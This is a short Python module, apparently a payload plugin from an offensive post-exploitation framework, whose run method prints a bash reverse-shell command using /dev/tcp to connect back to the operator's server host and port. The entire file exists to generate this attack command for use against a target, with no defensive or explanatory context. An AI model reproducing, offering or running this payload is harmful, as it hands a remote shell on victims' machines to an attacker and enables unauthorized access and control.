from modules import helper as h
class payload:
	def __init__(self):
		self.name = "bash"
		self.description = "creates a bash payload"
		self.usage = "run in terminal"

	def run(self,server):
		print h.WHITE + "-"*40 + h.ENDC
		print h.COLOR_INFO+"bash &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"+h.ENDC
		print h.WHITE + "-"*40 + h.ENDC
